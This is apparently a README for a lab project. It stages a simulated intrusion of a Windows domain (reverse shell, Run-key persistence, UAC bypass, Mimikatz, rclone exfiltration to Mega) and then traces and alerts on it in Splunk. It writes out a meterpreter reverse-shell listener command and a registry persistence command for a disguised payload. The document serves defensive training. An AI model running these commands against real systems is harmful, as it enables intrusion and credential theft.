

# Description

This project demonstrates a penetration test simulation, mapping out an attack from initial access to data exfiltration within a corporate network environment. Then conducting an analysis of the attack using Splunk SIEM and creating alerts based on the attack

Goal: Simulate a cyberattack and then document and analyze the steps involved, highlighting key attack techniques from the MITRE ATT&CK framework. 

# Content:
- [Attack Simulation](#attack-simulation)
  - [Initial Access](#1-initial-access)
  - [Persistence](#2-persistence)
  - [Enumeration](#3-enumeration)
  - [Privilege Escalation](#4-privilege-escalation)
  - [Credential Access](#5-credential-access-t1003---credential-dumping)
  - [Lateral Movement](#6-lateral-movement)
  - [Data Exfiltration](#7-data-exfiltration)
- [Analysis and Reporting](#analysis-and-reporting)

&nbsp;
&nbsp;
&nbsp;


# Attack Simulation
&nbsp;
&nbsp;


**Generated shellcode that will have the target connect to 192.168.1.59:4444**

![image](https://github.com/user-attachments/assets/c8ee123e-461a-4657-bbf1-58818a85f39b)

Then I set up the listener using:  `msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.59; set LPORT 4444; exploit"`

- **Payload**: windows/x64/meterpreter/reverse_tcp
- **LHOST (Listening host)**: 192.168.1.59
- **LPORT (Listening Port)**: 4444

## 🚪 1\. **(Initial Access)**

I created a basic [shellcode injector](https://github.com/shaydan12/ShellcodeInjector) that will inject shellcode into a specified process. The shellcode created from msfvenom will be placed in there.

Target runs the executable which then executes a meterpreter shell connection to 192.168.1.59 (port 4444), once I gained access I migrated to a different process

## 📌 2\. **(Persistence)**

### **T1547 - Boot or Logon Autostart Execution**

I gained persistence by adding a new value to the Run key in the registry specifying that I want the malware to run every time Windows starts up.

`reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "123Start" /t REG_SZ /d "C:\Users\s.chisholm.mayorsec\Downloads\Antivirus.exe" /f`

![image](https://github.com/user-attachments/assets/ba42f3d2-d39a-41bd-ba41-6862d63e31cd)

## 🔎 3\. Enumeration

### **T1016 System Network Configuration Discovery**

I looked for other computers on the network using the Get-ADComputer Powershell module.

`Get-ADComputer -Filter * | Select-Object Name, DNSHostName, OperatingSystem`

![image](https://github.com/user-attachments/assets/3a3061e9-2ebe-4fcf-9a6e-b65c1f3803ee)

## 🚀 4\. (**Privilege Escalation**):

I used the "windows/local/bypassuac_sdclt" module in Metasploit to attempt to elevate my privileges to SYSTEM, the highest privilege on Windows.

![image](https://github.com/user-attachments/assets/fb89a9f6-7a2c-4e4c-919e-05a502b75cd8)

I then migrated to a process running with SYSTEM privileges in order to perform privilege escalation.  
![image](https://github.com/user-attachments/assets/34b63708-c5e8-4fa2-98c0-9008469f0850)

## 🔑 5\. (**Credential Access**), (T1003 - Credential Dumping)

I downloaded mimikatz, in order to get dump hashes and passwords.

![image](https://github.com/user-attachments/assets/fdedade4-7fcf-44d6-b612-cfc85708e356)

I also found a password in cleartext:  
![image](https://github.com/user-attachments/assets/300c1108-6e71-42a8-8ffa-5a3354aeb722)

## 🔁 6\. **(Lateral Movement)**

I attempted to move onto the domain controller using credentials I gathered from Mimikatz and the info gathered from Get-ADComputers.

![image](https://github.com/user-attachments/assets/591cd233-0387-456b-9ace-2d4b02721eca)

&nbsp;

## 📤📦 7\. **(Data Exfiltration)**

### **Exfiltration Over Web Service - T1567**

I downloaded the rclone binary to the target machine, set up the configuration and cloud storage credentials in order to exfiltrate data from a network share on the domain controller. Rclone is a legitimate command-line program used to manage files on cloud storage.

![image](https://github.com/user-attachments/assets/ff6d145a-99ba-4e12-80b9-1e8eb8012057)

![image](https://github.com/user-attachments/assets/a04e632d-a53e-4279-9066-c20c78f6f4c7)

Data exfiltrated to attacker's Mega cloud storage:  
![image](https://github.com/user-attachments/assets/61815e9e-5c12-4b3b-8f61-00ff6ffc0d24)

![image](https://github.com/user-attachments/assets/46c6413b-7f5c-4480-9576-a18cb35edf0d)




# **Analysis and Reporting**
&nbsp;
&nbsp;




## **Initial Infection**

I tracked down the initial shellcode injection by looking trough the Sysmon logs that contain the event ID of 8 (CreateRemoteThread)

Query:  `source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=8 | table SourceImage, TargetImage, EventCode, SystemTime`

![image](https://github.com/user-attachments/assets/0a4284c0-71ab-447e-9195-99bcbd544e5f)

I found multiple remote threads created through various images, which indicates that the malware was migrating through processes in order to perform certain tasks. This begins with a process migration from  "Antivirus.exe" to notepad.exe

Antivirus.exe → notepad.exe → Onedrive.exe

ULGNkQPaRYY.exe → svchost.exe

HzcwAf.exe → winlogin.exe

Along with an "unknown process" migrating into mimikatz.exe which indicates that "Mimikatz" was downloaded to the target system.

Migration to a process gives the source process the same privileges as the target process. The migration to svchost.exe and winlogin.exe indicate privilege escalation, as both windows services typically run with SYSTEM privileges.

&nbsp;

I was able to scan "Antivirus.exe" and "ULGNkQPaRYY.exe" on VirusTotal, and many vendors claim both executables as malicious:

![image](https://github.com/user-attachments/assets/eb72b407-d9c6-40a4-b39c-66868273ab0d)

![image](https://github.com/user-attachments/assets/02965e4b-af43-49ae-9408-886096607685)

The user downloaded "Antivirus.exe" using Microsoft Edge, the time of infection was on 14 September 2024, 13:33:23 UTC:

Filter: `source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=11 "Antivirus.exe"`

![image](https://github.com/user-attachments/assets/1939546d-948b-442d-a338-b94824780104)

&nbsp;

## Persistence (T1547 - Boot or Logon Autostart Execution)

I searched for events with a sysmon event code of 13, in order to track down any changes to the registry:

```
source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" "Antivirus.exe" EventCode=13 | table registry_key_name, registry_value_name, registry_value_data
```

![image](https://github.com/user-attachments/assets/ebe1fa77-77a0-48b2-9b2a-95713a785021)

The malware used the Run registry key in order to gain persistence on the target machine. Every time Windows starts up, the malware will run.

&nbsp;

&nbsp;

## **Credential Access - (T1003 - Credential Dumping)**

A process named "Mimikatz" was discovered on the victim machine.

I searched for "mimikatz" and confirmed that the Mimikatz process was created in order to dump credentials, the executable was renamed to 123.exe:

![image](https://github.com/user-attachments/assets/19ded05d-10e8-4f3d-b2f8-333e0f4d0764)

Hash lookup on VirusTotal:

![image](https://github.com/user-attachments/assets/c62c7cb3-d336-4cef-bb0f-bf0e83f4399b)

&nbsp;

&nbsp;

## **Data Exfiltration (T1567 - Exfiltration Over Web Service)**

I looked for NetworkConnection (Event ID 3) events to look for any clues of data exfiltration.

In the Image field, I see an executable named "rclone.exe" which made 45.3% of overall network connections during the attack.

![image](https://github.com/user-attachments/assets/ccca75e2-43d6-4608-a083-9830949d274b)

&nbsp;

Rclone is a legitimate command-line program used to manage files on cloud storage. It has been used by attackers to exfiltrate data to a remote location while lowering the likelihood of raising suspicion.

&nbsp;

&nbsp;

Because it is a command-line tool, I will look for any commands associated with the tool to find out what may have been exfiltrated and where to.

![image](https://github.com/user-attachments/assets/f6449ef6-f9e7-4778-8f7c-ba121af20586)

&nbsp;

Looking for hostnames that rclone contacted.

![image](https://github.com/user-attachments/assets/188b9755-b6e6-42bc-b082-7b21252bd254)

Rclone was used to copy the Network share located on the domain controller to Mega cloud storage.

&nbsp;

&nbsp;

## Creating the Alerts

### Mimikatz

Creating an alert for the mimikatz.exe binary:

Search:

```
OriginalFileName="mimikatz.exe" ParentCommandLine="C:\\Windows\\system32\\cmd.exe" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
```

![image](https://github.com/user-attachments/assets/94219f61-01c8-4856-b22e-9d8fe7d19a45)

&nbsp;

&nbsp;

&nbsp;

### Registry change

Creating an alert any time a change to the 'Run' registry occurs

![image](https://github.com/user-attachments/assets/1a16c377-6724-4b2b-9dfd-cf786eadac8a)

![image](https://github.com/user-attachments/assets/81ce9cf5-689a-4d5b-9735-d9404fd16bec)

&nbsp;

&nbsp;

&nbsp;

